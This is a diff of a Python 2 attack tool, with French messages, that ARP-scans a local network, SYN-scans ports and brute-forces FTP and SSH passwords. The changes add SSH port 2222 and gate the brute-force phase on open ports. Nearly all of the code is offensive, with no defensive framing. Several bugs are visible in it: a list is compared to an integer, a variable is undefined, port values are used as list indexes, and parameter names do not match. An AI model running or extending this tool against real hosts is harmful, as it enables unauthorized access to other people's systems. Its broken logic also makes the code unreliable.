@@ -31,10 +31,8 @@ import scapy.config
 from ftplib import FTP
 import scapy.layers.l2
 from scapy.all import *
-from time import strftime
 from random import randint
 from threading import Thread
-from datetime import datetime
 from argparse import ArgumentParser
 from paramiko import SSHClient, AutoAddPolicy
 from string import digits, ascii_lowercase, uppercase, hexdigits, letters, punctuation
@@ -46,6 +44,7 @@ online  	= {}
 ips_o,pwd	= [],[]
 SYNACK  	= 0x12
 flag,ftop	= 0,0
+bf_ok		= False
 
 logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s',
 		    datefmt='%Y-%m-%d %H:%M:%S',
@@ -53,6 +52,10 @@ logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s',
 logger = logging.getLogger(__name__)
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
+
+def print_fmt(sentence):
+	lgth = len(sentence)
+	print sentence + '\n' + '-'*(lgth-9)
 
 def pwd_alpha(lgr, mode):
 	if mode == 'lower':
@@ -111,7 +114,7 @@ def detonate(log, addr, psswd, essai):
 	except:
 		trig.close()
 
-def ssh_conn(log, addr, passwd, essau):
+def ssh_conn(log, addr, passwd, essai, port):
 	global flag
 	try:
 		client = SSHClient()
@@ -122,6 +125,7 @@ def ssh_conn(log, addr, passwd, essau):
 			username=log,
 			password=psswd,
 			timeout=10,
+			port= port,
 			look_for_keys=False)
 		print '\n\n\033[91m[+]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
 		flag = 1
@@ -217,7 +221,7 @@ def network_scan(ip):
 	return [ip_reseau + str(suffixe) for suffixe in range(int(pre[3]),all_hosts,1)]
 
 def scanner(target):
-	global online
+	global online, bf_ok
 	ports_i = []
 	for port in known_ports:
 		try:
@@ -232,6 +236,8 @@ def scanner(target):
 	        		RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
 				send(RSTpkt)
 			online[target] = ports_i
+			if ports_i == 22 or ports_i == 2222 or ports_i == 21:
+				bf_ok = True
 		except KeyboardInterrupt:
 			RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
 			send(RSTpkt)
@@ -244,7 +250,7 @@ def port_scan(ip):
 	global ips_o, online
 	all_hosts = []
 	if ip == get_ip():
-		print '\n\033[92m[*]\033[0m Scan du réseau local:'
+		print_fmt('\n\033[92m[*]\033[0m Scan du réseau local:')
 		local_network_scan()
 		if not ips_o:
 			sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
@@ -259,7 +265,7 @@ def port_scan(ip):
 		for thr in threads:
 			thr.join()
 	if ips_o:
-		print '\n\033[92m[*]\033[0m Scan de port sur les machines ARPées:'
+		print_fmt('\n\033[92m[*]\033[0m Scan de port sur les machines ARPées:')
 		threads = []
 		for ip in ips_o:
 			proc = Thread(target=scanner,args=(ip,))
@@ -269,7 +275,8 @@ def port_scan(ip):
 			thr.join()
 	else:
 		sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
-	print '\n\033[92m[*]\033[0m Résumé du scan de ports:\n{}\n'.format(online)
+	print_fmt('\n\033[92m[*]\033[0m Résumé du scan de ports:')
+	print online
 
 def get_ip():
 	try:
@@ -394,7 +401,7 @@ if __name__ == '__main__':
 	ips = network_scan(ip)
 	port_scan(ip)
 
-	if args.bruteforce:
+	if args.bruteforce and bf_ok:
 		if args.wordlist is not None:
 			try:
 				print "\033[94m[+]\033[0m Prise en compte de la wordlist:", args.wordlist[0]
@@ -410,10 +417,15 @@ if __name__ == '__main__':
 			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]\n"
 			dic = generate(args.mode[0], args.longueur[0])
 
+	elif args.bruteforce:
+		print '\n\033[94m[~]\033[0m Pas de ports à bruteforcer [21/22/2222].'
+
+	print_fmt('\n\033[92m[*]\033[0m Phase de capture/reconnaissance brutale:')
+
 	if online is not None:
 		for host in online:
 # FTP ----------------------------------------------------------------------------------------------------------
-			if args.bruteforce:
+			if args.bruteforce and bf_ok:
 				idx = 0
 				if 21 in online[host]:
 					print "\n\033[33m[+]\033[0m Cible avec FTP ouvert : %s." % host
@@ -438,12 +450,13 @@ if __name__ == '__main__':
 						logger.error("\033[91m[-]\033[0m BF FTP.")
 				idx = 0
 # SSH ----------------------------------------------------------------------------------------------------------
-				if 22 in online[host]:
-					print "\n\033[31m[+]\033[0m Cible avec SSH ouvert : %s." % host
+				if 22 in online[host] or 2222 in online[host]:
+					port_idx = [x for i,x in enumerate(online[host]) if x == 22 or x == 2222]
+					print "\n\033[31m[+]\033[0m Cible avec SSH ouvert : %s sur %d." % (host, online[host][port_idx[0]])
 					try:
 						threads = []
 						for psswd in dic:
-							conn = Thread(target=ssh_conn,args=(user,addr,psswd,idx,))
+							conn = Thread(target=ssh_conn,args=(user,addr,psswd,idx,online[host][port_idx[0]],))
 							threads.append(t)
 							conn.start()
 							idx += 1
